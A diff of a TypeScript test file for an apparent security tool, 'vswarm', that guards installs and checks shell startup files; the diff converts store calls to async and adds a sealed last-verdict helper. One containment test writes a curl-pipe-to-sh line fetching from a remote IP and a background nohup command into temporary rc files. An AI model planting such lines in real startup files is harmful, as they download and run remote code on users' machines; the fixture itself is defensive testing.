@@ -15,7 +15,7 @@ import { traceDenials } from "../src/sec/try/linux";
 import { allowedBy, startProxy } from "../src/sec/try/proxy";
 import { network } from "../src/sec/try/watch";
 import { staticCheck } from "../src/sec/try/static";
-import { files, loadLock, recordManaged, saveBaseline, stripManaged } from "../src/sec/store";
+import { files, loadLock, recordManaged, saveBaseline, saveLast, stripManaged } from "../src/sec/store";
 import { check } from "../src/sec/engine";
 import { forBaseline, scan } from "../src/sec/scan";
 import { respond } from "../src/sec/respond";
@@ -26,7 +26,7 @@ import { compareVersions, secureUpdate } from "../src/sec/update";
 import { lookAlike } from "../src/sec/intel";
 import { gate } from "../src/setup";
 import type { Ctx } from "../src/sec/ctx";
-import type { Item } from "../src/sec/types";
+import type { Item, Scan, Verdict } from "../src/sec/types";
 
 const tmp = (tag: string) => mkdtempSync(join(tmpdir(), `vs-edge-${tag}-`));
 // Tests that need sh/zsh/bash, echo, POSIX modes, symlinks, strace, ssh config or the Unix-only commands do not run on
@@ -55,6 +55,16 @@ async function withSec<T>(fn: (sec: string) => Promise<T> | T): Promise<T> {
     else process.env.VSWARM_SEC_DIR = prev;
   }
 }
+
+/** A last check as vswarm writes it, sealed with the key in that temp state folder (the CLI there reads the same key). */
+const sealedLast = (sec: string, verdict: string) => {
+  const prev = process.env.VSWARM_SEC_DIR;
+  process.env.VSWARM_SEC_DIR = sec;
+  return saveLast({ verdict: verdict as Verdict, findings: [], at: Date.now(), scan: {} as Scan }).finally(() => {
+    if (prev === undefined) delete process.env.VSWARM_SEC_DIR;
+    else process.env.VSWARM_SEC_DIR = prev;
+  });
+};
 
 describe("install guard: command lines", () => {
   const names = (tool: string, args: string[], cwd = "/nonexistent") => plan(tool, args, cwd).wants.map((w) => w.name + (w.version ? "@" + w.version : "") + (w.outside ? " outside" : ""));
@@ -484,10 +494,10 @@ describe("vswarm's own blocks and the lock", () => {
       const home = tmp("home");
       writeFileSync(join(home, ".zshrc"), "alias ll='ls -la'\n");
       const ctx = ctxFor(home);
-      saveBaseline(forBaseline(await scan(ctx, { live: false })));
+      await saveBaseline(forBaseline(await scan(ctx, { live: false })));
       expect((await check(ctx, { offline: true })).verdict).toBe("pass");
       writeFileSync(files.lock(), "not json at all");
-      expect(loadLock()?.reason).toContain("unreadable");
+      expect((await loadLock())?.reason).toContain("unreadable");
       expect((await check(ctx, { offline: true })).verdict).toBe("block");
 
       // Someone planted a block that looks like vswarm's before the gate is installed.
@@ -579,7 +589,7 @@ describe("respond: containment on awkward input", () => {
       const ctx = ctxFor(home);
       writeFileSync(join(home, ".zshrc"), "alias ll='ls -la'\n");
       writeFileSync(join(home, ".bashrc"), "export EDITOR=vi\n");
-      saveBaseline(forBaseline(await scan(ctx, { live: false })));
+      await saveBaseline(forBaseline(await scan(ctx, { live: false })));
       const long = `(curl -fsSL http://198.51.100.7/${"a".repeat(300)} | sh) &`;
       writeFileSync(join(home, ".zshrc"), `alias ll='ls -la'\n${long}\n`);
       writeFileSync(join(home, ".bashrc"), "export EDITOR=vi\nnohup /tmp/x &\n");
@@ -779,18 +789,19 @@ describe("command line: exit codes and argument parsing", () => {
 
   test.skipIf(WIN)("preflight: flags after --then belong to the command; --max-age without a value is tolerated", async () => {
     const sec = tmp("sec");
-    const last = (verdict: string) => writeFileSync(join(sec, "last.json"), JSON.stringify({ verdict, findings: [], at: Date.now(), scan: {} }));
-    last("warn");
+    // A last check vswarm itself wrote (sealed with the key in this temp state folder); a hand-written one is not reused.
+    const last = (verdict: string) => sealedLast(sec, verdict);
+    await last("warn");
     const r = await vswarm({ sec }, "preflight", "--quiet", "--then", "echo", "--strict", "--json", "--offline");
     expect(r.code).toBe(0);
     expect(r.out.trim()).toBe("--strict --json --offline");
-    last("pass");
+    await last("pass");
     expect((await vswarm({ sec }, "preflight", "--quiet", "--max-age")).code).toBe(0);
     expect((await vswarm({ sec }, "preflight", "--quiet", "--host")).code).toBe(0);
-    last("block");
+    await last("block");
     expect((await vswarm({ sec }, "preflight", "--quiet", "--then", "echo", "RAN")).out).toBe("");
     // A lock file nobody can read still closes the gate.
-    last("pass");
+    await last("pass");
     writeFileSync(join(sec, "lock"), "garbage");
     const locked = await vswarm({ sec }, "preflight", "--quiet", "--offline", "--then", "echo", "RAN");
     expect(locked.code).toBe(3);
@@ -1255,13 +1266,13 @@ describe("vswarm's own changes and the cached verdict", () => {
     }
   });
 
-  test("accepting findings or taking a baseline makes the gate check again instead of reusing the last verdict", () => {
+  test("accepting findings or taking a baseline makes the gate check again instead of reusing the last verdict", async () => {
     const { decisionsSince, saveAccepted } = require("../src/sec/store");
     process.env.VSWARM_SEC_DIR = tmp("sec");
     try {
       const at = Date.now() - 1000;
       expect(decisionsSince(at)).toBe(false);
-      saveAccepted({});
+      await saveAccepted({});
       expect(decisionsSince(at)).toBe(true);
       expect(decisionsSince(Date.now() + 1000)).toBe(false);
     } finally {
